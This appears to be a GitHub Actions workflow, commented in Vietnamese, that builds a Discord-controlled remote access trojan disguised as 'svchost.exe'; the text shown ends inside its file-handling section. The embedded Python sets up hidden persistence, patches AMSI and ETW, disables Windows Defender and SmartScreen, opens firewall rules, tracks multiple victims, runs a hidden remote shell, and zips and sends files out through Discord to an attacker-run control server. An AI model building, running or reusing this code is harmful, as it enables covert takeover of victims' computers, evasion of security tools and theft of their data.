name: Build svchost

on:
  workflow_dispatch:
    inputs:
      token:
        description: 'Discord Bot Token (ĐỂ TRỐNG nếu chỉ dùng web)'
        required: false
        default: ''
        type: string
      token_url:
        description: 'URL chứa token (raw gist) - để trống nếu nhúng'
        required: false
        default: ''
        type: string
      control_channel:
        description: 'ID kênh điều khiển (0 = tự chọn)'
        required: false
        default: '0'
        type: string
      control_url:
        description: 'URL server web control'
        required: false
        default: 'https://control.bot-keep.xyz'
        type: string
      agent_key:
        description: 'Key cho agent (khớp AGENT_KEY bên server, rỗng = không cần)'
        required: false
        default: ''
        type: string
      obfuscate:
        description: 'Obfuscate bằng PyArmor? (yes/no)'
        required: false
        default: 'yes'
        type: string
      sign:
        description: 'Ký số self-signed? (yes/no)'
        required: false
        default: 'yes'
        type: string
      run_minutes:
        description: 'Số phút chạy test (0 = bỏ qua)'
        required: false
        default: '5'
        type: string
      make_release:
        description: 'Tạo Release? (yes/no)'
        required: false
        default: 'yes'
        type: string

permissions:
  contents: write

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 30
    env:
      PYTHONIOENCODING: utf-8
      PYTHONUTF8: '1'

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Python 3.11
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
          architecture: 'x64'

      - name: Ghi agent.py
        shell: pwsh
        run: |
          $py = @'
          # ============================================================
          #   DISCORD REMOTE AGENT "svchost" - FULL + WEB REALTIME CONTROL
          # ============================================================
          import os, sys, io, time, json, socket, ctypes, zipfile, subprocess, threading, wave
          import base64, glob, shutil, tempfile, platform, datetime, queue, asyncio, re, random, hashlib
          import ssl as _ssl

          import discord

          # ---------------- CẤU HÌNH ----------------
          TOKEN         = ""
          _TOK_ENC      = ""
          _TOK_KEY      = ""
          TOKEN_URL     = ""
          CONTROL_CH_ID = 0
          PREFIX        = "!"
          MACHINE_ID    = platform.node().split(".")[0][:20] or "PC"
          EXE_NAME      = "svchost.exe"
          RUN_KEY       = "svchost"
          INSTALL_DIR   = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "Microsoft")
          SCRIPT_PATH   = os.path.join(INSTALL_DIR, EXE_NAME)
          MARKER        = os.path.join(INSTALL_DIR, ".svc")
          LOOT_DIR      = os.path.join(INSTALL_DIR, "loot")
          PEND_DIR      = os.path.join(LOOT_DIR, "pending")
          SEL_FILE      = os.path.join(INSTALL_DIR, "sel")
          REG_PREFIX    = "SVCREG|"
          WEBHOOK       = ""
          _RAW          = {}
          FRESH         = 180
          CHUNK_LIMIT   = 24 * 1024 * 1024
          _last_beat    = [time.time()]

          def _token():
              if TOKEN_URL and requests:
                  try:
                      t = requests.get(TOKEN_URL, timeout=15).text.strip()
                      if t: return t
                  except Exception: pass
              if not _TOK_ENC or not _TOK_KEY:
                  return TOKEN or ""
              try:
                  data = base64.b64decode(_TOK_ENC)[::-1]
                  key = base64.b64decode(_TOK_KEY)
                  return bytes(b ^ key[i % len(key)] for i, b in enumerate(data)).decode()
              except Exception:
                  return TOKEN or ""

          def _imp(n):
              try: return __import__(n)
              except Exception: return None

          psutil = _imp("psutil"); cv2 = _imp("cv2"); mss = _imp("mss")
          pyautogui = _imp("pyautogui"); pyperclip = _imp("pyperclip")
          pynput = _imp("pynput"); requests = _imp("requests"); np = _imp("numpy")
          sd = _imp("sounddevice"); sf = _imp("soundfile"); sc = _imp("soundcard")
          websocket = _imp("websocket")
          try:
              from PIL import Image, ImageGrab
          except Exception:
              Image = ImageGrab = None

          os.makedirs(LOOT_DIR, exist_ok=True)
          os.makedirs(PEND_DIR, exist_ok=True)
          NO_WIN = 0x08000000

          # ============================================================
          #  NGỤY TRANG / PERSIST (task onlogon + guard 5 phút, KHÔNG ở tab Startup)
          # ============================================================
          def self_path():
              return sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])

          def hide_console():
              try:
                  hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                  if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
                  ctypes.windll.kernel32.SetConsoleTitleW("svchost")
              except Exception: pass

          def hide_folder(p):
              try: subprocess.call(f'attrib +h "{p}"', shell=True)
              except Exception: pass

          def unblock(path):
              try:
                  subprocess.call(f'powershell -NoProfile -Command "Unblock-File -Path \'{path}\'"',
                                  shell=True, creationflags=NO_WIN)
              except Exception: pass

          _sock = None
          def single_instance():
              global _sock
              _sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              for port in (47823, 47824, 47825):
                  try:
                      _sock.bind(("127.0.0.1", port)); _sock.listen(1); return True
                  except OSError: pass
              return False

          def reg_set(name, value):
              import winreg
              k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                  r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
              winreg.SetValueEx(k, name, 0, winreg.REG_SZ, value); winreg.CloseKey(k)

          def reg_del(name):
              import winreg
              try:
                  k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                      r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                  winreg.DeleteValue(k, name); winreg.CloseKey(k)
              except Exception: pass

          def _schtasks(name, tr, sched, mo=None):
              try:
                  args = ["schtasks", "/create", "/tn", name, "/tr", tr, "/sc", sched]
                  if mo: args += ["/mo", str(mo)]
                  args += ["/f"]
                  r = subprocess.run(args, capture_output=True, creationflags=NO_WIN, timeout=30)
                  return r.returncode == 0
              except Exception: return False

          def _launch_cmd():
              if getattr(sys, "frozen", False):
                  return f'"{SCRIPT_PATH}"'
              pyw = sys.executable
              if pyw.lower().endswith("python.exe"):
                  pyw = pyw[:-len("python.exe")] + "pythonw.exe"
              return f'"{pyw}" "{SCRIPT_PATH}"'

          def _guard_vbs():
              g = os.path.join(INSTALL_DIR, "guard.vbs")
              tgt = SCRIPT_PATH
              vbs = (
                  'On Error Resume Next\r\n'
                  'Set sh = CreateObject("WScript.Shell")\r\n'
                  'Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")\r\n'
                  'f = False\r\n'
                  'For Each pr In wmi.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name=\'svchost.exe\'")\r\n'
                  '  ep = pr.ExecutablePath\r\n'
                  '  If Not IsNull(ep) Then\r\n'
                  '    If LCase(ep) = LCase("' + tgt + '") Then f = True\r\n'
                  '  End If\r\n'
                  'Next\r\n'
                  'If Not f Then sh.Run Chr(34) & "' + tgt + '" & Chr(34), 0, False\r\n'
              )
              try:
                  with open(g, "w", encoding="utf-8") as f: f.write(vbs)
              except Exception: pass
              return g

          def install():
              try:
                  os.makedirs(INSTALL_DIR, exist_ok=True)
                  me = self_path()
                  if os.path.normcase(me) != os.path.normcase(SCRIPT_PATH):
                      shutil.copy2(me, SCRIPT_PATH)
                  launch = _launch_cmd()
                  ok1 = _schtasks("svchost", launch, "onlogon")
                  g = _guard_vbs()
                  ok2 = _schtasks("svchost_g", f'wscript.exe "{g}"', "minute", 5)
                  if not (ok1 and ok2):
                      reg_set(RUN_KEY, launch)
                      try:
                          startup = os.path.join(os.environ["APPDATA"],
                                      r"Microsoft\Windows\Start Menu\Programs\Startup")
                          with open(os.path.join(startup, "svchost.vbs"), "w", encoding="utf-8") as f:
                              f.write(f'CreateObject("WScript.Shell").Run "{launch}", 0, False\n')
                      except Exception: pass
                  with open(MARKER, "w") as f: f.write("ok")
                  hide_folder(INSTALL_DIR); unblock(SCRIPT_PATH)
                  try: f_timestomp(SCRIPT_PATH)
                  except Exception: pass
              except Exception as e:
                  print("install:", e)

          def install_task():
              try:
                  _schtasks("svchost", _launch_cmd(), "onlogon")
                  _schtasks("svchost_g", f'wscript.exe "{_guard_vbs()}"', "minute", 5)
              except Exception: pass

          def uninstall():
              reg_del(RUN_KEY)
              try:
                  subprocess.call('schtasks /delete /tn svchost /f', shell=True, creationflags=NO_WIN)
                  subprocess.call('schtasks /delete /tn svchost_g /f', shell=True, creationflags=NO_WIN)
              except Exception: pass
              try:
                  v = os.path.join(os.environ["APPDATA"],
                      r"Microsoft\Windows\Start Menu\Programs\Startup\svchost.vbs")
                  if os.path.exists(v): os.remove(v)
              except Exception: pass

          # ============================================================
          #  BYPASS AV
          # ============================================================
          def amsi_patch():
              try:
                  k = ctypes.windll.kernel32
                  h = k.LoadLibraryW("amsi.dll")
                  if not h: return "không load amsi.dll"
                  addr = k.GetProcAddress(h, b"AmsiScanBuffer")
                  patch = b"\xB8\x57\x00\x07\x80\xC3"
                  old = ctypes.c_ulong()
                  k.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old))
                  ctypes.memmove(addr, patch, len(patch))
                  k.VirtualProtect(addr, len(patch), old, ctypes.byref(old))
                  return "AMSI patched"
              except Exception as e: return f"AMSI lỗi: {e}"

          def etw_patch():
              try:
                  k = ctypes.windll.kernel32
                  h = k.GetModuleHandleW("ntdll.dll")
                  addr = k.GetProcAddress(h, b"EtwEventWrite")
                  patch = b"\x48\x33\xC0\xC3"
                  old = ctypes.c_ulong()
                  k.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old))
                  ctypes.memmove(addr, patch, len(patch))
                  k.VirtualProtect(addr, len(patch), old, ctypes.byref(old))
                  return "ETW patched"
              except Exception as e: return f"ETW lỗi: {e}"

          AMSI_BYPASS = ("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                         ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")

          def f_amsi(cmd):
              return run_cmd(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{AMSI_BYPASS}; {cmd}"', 120)

          def _hklm(path, name, val, typ=4):
              try:
                  import winreg
                  k = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE)
                  winreg.SetValueEx(k, name, 0, typ, val); winreg.CloseKey(k)
                  return True
              except Exception: return False

          def f_bypass():
              out = []
              for p in (INSTALL_DIR, LOOT_DIR, SCRIPT_PATH):
                  out.append(run_cmd(f'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath \'{p}\'"'))
                  if _hklm(r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths", p, 0): out.append(f"[reg] excl {p}")
              out.append(run_cmd('powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess \'svchost.exe\'"'))
              out.append(run_cmd('powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'))
              _hklm(r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1)
              _hklm(r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection", "DisableIOAVProtection", 1)
              _hklm(r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", 1)
              _hklm(r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection", "DisableScriptScanning", 1)
              _hklm(r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1)
              _hklm(r"SOFTWARE\Policies\Microsoft\Windows\System", "EnableSmartScreen", 0)
              _hklm(r"SOFTWARE\Microsoft\Windows\CurrentVersion\SmartScreenEnabled", "SmartScreenEnabled", "Off", 1)
              out.append(run_cmd(f'netsh advfirewall firewall add rule name="svchost" dir=in action=allow program="{SCRIPT_PATH}" enable=yes'))
              out.append(run_cmd(f'netsh advfirewall firewall add rule name="svchost_out" dir=out action=allow program="{SCRIPT_PATH}" enable=yes'))
              unblock(SCRIPT_PATH)
              return "\n".join(x for x in out if x) or "[đã áp dụng]"

          def f_defender(state="status"):
              s = state.lower()
              if s in ("off","disable","0"):
                  return run_cmd('powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
              if s in ("on","enable","1"):
                  return run_cmd('powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false"')
              return run_cmd('powershell -NoProfile -Command "Get-MpComputerStatus | '
                             'Select AMServiceEnabled,RealTimeProtectionEnabled,AntivirusEnabled | Format-List"')

          def f_timestomp(path, ref=r"C:\Windows\System32\svchost.exe"):
              path = os.path.expanduser(path or SCRIPT_PATH)
              try:
                  st = os.stat(ref); os.utime(path, (st.st_atime, st.st_mtime))
                  return f"Đã timestomp {path}"
              except Exception as e: return f"Lỗi: {e}"

          def f_hide(path):
              try:
                  subprocess.call(f'attrib +h +s +r "{os.path.expanduser(path)}"',
                                  shell=True, creationflags=NO_WIN)
                  return f"Đã ẩn: {path}"
              except Exception as e: return f"Lỗi: {e}"

          def f_clone(path):
              path = os.path.expanduser(path)
              try:
                  os.makedirs(os.path.dirname(path), exist_ok=True)
                  shutil.copy2(self_path(), path); unblock(path)
                  subprocess.Popen(f'cmd /c start "" "{path}"', shell=True, creationflags=NO_WIN)
                  return f"Đã clone → {path}"
              except Exception as e: return f"Lỗi: {e}"

          def f_sandbox():
              out = []
              try: out.append(f"Debugger: {bool(ctypes.windll.kernel32.IsDebuggerPresent())}")
              except Exception: pass
              if psutil:
                  up = time.time() - psutil.boot_time()
                  out.append(f"CPU: {psutil.cpu_count()} | RAM: {round(psutil.virtual_memory().total/1e9,1)}GB")
                  out.append(f"Uptime: {int(up)}s")
              out.append(run_cmd('wmic computersystem get model,manufacturer'))
              return "\n".join(x for x in out if x)

          # ============================================================
          #  HELPERS
          # ============================================================
          async def ex(fn, *a):
              return await client.loop.run_in_executor(None, lambda: fn(*a))

          async def send_long(message, text, lang=""):
              text = text or "[trống]"
              while text:
                  chunk, text = text[:1900], text[1900:]
                  await message.channel.send(f"```{lang}\n{chunk}\n```")

          async def _send_file(ch, path, filename=None):
              filename = filename or os.path.basename(path)
              size = os.path.getsize(path)
              if size <= CHUNK_LIMIT:
                  await ch.send(file=discord.File(path, filename=filename)); return
              parts = []
              with open(path, "rb") as f:
                  i = 1
                  while True:
                      b = f.read(CHUNK_LIMIT)
                      if not b: break
                      pp = f"{path}.p{i:02d}"
                      open(pp, "wb").write(b); parts.append((pp, f"{filename}.part{i:02d}")); i += 1
              tot = len(parts)
              await ch.send(f"📦 File lớn ({human(size)}) → chia {tot} phần. Ghép: `copy /b \"{filename}.part*\" \"{filename}\"`")
              for idx, (pp, pn) in enumerate(parts, 1):
                  try:
                      await ch.send(f"[{idx}/{tot}]", file=discord.File(pp, filename=pn))
                  finally:
                      try: os.remove(pp)
                      except Exception: pass

          def run_cmd(cmd, timeout=60):
              try:
                  out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                                timeout=timeout, creationflags=NO_WIN)
                  return out.decode("utf-8", errors="ignore") or "[không output]"
              except subprocess.CalledProcessError as e:
                  return e.output.decode("utf-8", errors="ignore")
              except Exception as e: return f"[Lỗi] {e}"

          def human(n):
              for u in ("B","KB","MB","GB","TB"):
                  if n < 1024: return f"{n:.1f}{u}"
                  n /= 1024
              return f"{n:.1f}PB"

          def is_admin():
              try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
              except Exception: return False

          def active_window():
              try:
                  u = ctypes.windll.user32; h = u.GetForegroundWindow()
                  n = u.GetWindowTextLengthW(h); buf = ctypes.create_unicode_buffer(n + 1)
                  u.GetWindowTextW(h, buf, n + 1); return buf.value
              except Exception: return ""

          def _run_ps(script, name="svc_ps.ps1"):
              p = os.path.join(tempfile.gettempdir(), name)
              with open(p, "w", encoding="utf-8-sig") as f: f.write(script)
              subprocess.Popen(f'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "{p}"',
                               shell=True, creationflags=NO_WIN)

          # ============================================================
          #  MULTI-VICTIM (list / select / back / master)
          # ============================================================
          _reg_cache = {"ts": 0, "regs": {}}

          async def control_channel():
              if CONTROL_CH_ID:
                  try: return await client.fetch_channel(int(CONTROL_CH_ID))
                  except Exception: pass
              for g in client.guilds:
                  chans = [c for c in g.text_channels if c.permissions_for(g.me).send_messages]
                  if chans: return chans[0]
              return None

          async def _scan_regs(channel):
              now = time.time()
              if now - _reg_cache["ts"] < 30 and _reg_cache["regs"]:
                  regs = dict(_reg_cache["regs"])
              else:
                  regs = {}
                  try:
                      async for msg in channel.history(limit=300):
                          c = msg.content
                          if c.startswith(REG_PREFIX):
                              p = c.split("|")
                              if len(p) >= 5:
                                  try: seen = int(p[4])
                                  except Exception: seen = 0
                                  prev = regs.get(p[1])
                                  if not prev or seen > prev["seen"]:
                                      regs[p[1]] = {"id": p[1], "host": p[2],
                                                    "user": p[3], "seen": seen}
                  except Exception: pass
              regs[MACHINE_ID] = {"id": MACHINE_ID, "host": platform.node(),
                                  "user": os.environ.get("USERNAME", ""), "seen": int(now)}
              _reg_cache["ts"] = now; _reg_cache["regs"] = regs
              return regs

          async def _is_master(channel):
              regs = await _scan_regs(channel)
              now = time.time()
              live = [k for k, v in regs.items() if now - v.get("seen", 0) <= FRESH]
              return MACHINE_ID == min(live)

          def get_sel():
              try: return open(SEL_FILE).read().strip() or "all"
              except Exception: return "all"

          def set_sel(v):
              try: open(SEL_FILE, "w").write(v)
              except Exception: pass

          async def _register(ch):
              try: await ch.send(f"{REG_PREFIX}{MACHINE_ID}|{platform.node()}|{os.environ.get('USERNAME','')}|{int(time.time())}")
              except Exception: pass

          _reg_loop_started = [False]
          async def _reg_loop(ch):
              while True:
                  await asyncio.sleep(60)
                  _last_beat[0] = time.time()
                  await _register(ch)

          # ============================================================
          #  SHELL PHIÊN BỀN
          # ============================================================
          class Shell:
              def __init__(self):
                  self.lock = threading.Lock(); self.buf = bytearray()
                  self.cwd = os.path.expanduser("~"); self.proc = None; self._spawn()
              def _spawn(self):
                  self.proc = subprocess.Popen("cmd.exe", stdin=subprocess.PIPE,
                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=self.cwd,
                      bufsize=0, creationflags=NO_WIN)
                  threading.Thread(target=self._reader, daemon=True).start()
                  try:
                      self.proc.stdin.write(b"@echo off\r\n"); self.proc.stdin.flush()
                      time.sleep(0.3); self.buf.clear()
                  except Exception: pass
              def _reader(self):
                  while True:
                      try: chunk = os.read(self.proc.stdout.fileno(), 65536)
                      except Exception: break
                      if not chunk: break
                      self.buf += chunk
              def run(self, cmd, timeout=120):
                  with self.lock:
                      if self.proc.poll() is not None: self._spawn()
                      marker = "__SVC_9x7__"; self.buf.clear()
                      try:
                          self.proc.stdin.write((cmd + "\r\n").encode("utf-8", errors="ignore"))
                          self.proc.stdin.write(("echo " + marker + "%CD%" + marker + "\r\n").encode())
                          self.proc.stdin.flush()
                      except Exception:
                          self._spawn(); return "[shell restart]"
                      t0 = time.time()
                      while time.time() - t0 < timeout:
                          if marker.encode() in self.buf: break
                          if self.proc.poll() is not None: break
                          time.sleep(0.04)
                      data = self.buf.decode("utf-8", errors="ignore"); self.buf.clear()
                      if marker in data:
                          out, rest = data.split(marker, 1)
                          newcwd = rest.split(marker, 1)[0].strip()
                          if os.path.isdir(newcwd): self.cwd = newcwd
                          return out.strip() or "[ok]"
                      return (data.strip() or "[ok]") + "\n[timeout?]"

          _shell = Shell()

          # ============================================================
          #  FILE
          # ============================================================
          def f_ls(path="."):
              path = os.path.expanduser(path or ".")
              if not os.path.exists(path): return f"Không tồn tại: {path}"
              if os.path.isfile(path): return f"{human(os.path.getsize(path))}  {path}"
              lines = [f"📁 {os.path.abspath(path)}"]
              try:
                  for e in sorted(os.scandir(path), key=lambda x: x.name.lower()):
                      try:
                          if e.is_dir(): lines.append(f"[DIR ] {e.name}")
                          else: lines.append(f"{human(e.stat().st_size):>8}  {e.name}")
                      except Exception: pass
              except Exception as e: return f"Lỗi: {e}"
              return "\n".join(lines[:300])

          def f_search(name, root="C:\\"):
              hits = []
              for dp, dns, fns in os.walk(root):
                  for f in fns:
                      if name.lower() in f.lower():
                          hits.append(os.path.join(dp, f))
                          if len(hits) >= 100: return "\n".join(hits)
              return "\n".join(hits) or "Không tìm thấy"

          def f_del(path):
              path = os.path.expanduser(path)
              try:
                  if os.path.isdir(path): shutil.rmtree(path)
                  else: os.remove(path)
                  return f"Đã xóa: {path}"
              except Exception as e: return f"Lỗi: {e}"

          def f_zip(path):
              path = os.path.expanduser(path)
              out = os.path.join(tempfile.gettempdir(), "dump.zip")
              with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
                  if os.path.isdir(path):
                      for dp, dns, fns in os.walk(path):
                          for f in fns:
                              fp = os.path.join(dp, f)
                              try: z.write(fp, os.path.relpath(fp, path))
                              except Exception: pass
                  else: z.write(path, os.path.basename(path))
              return out

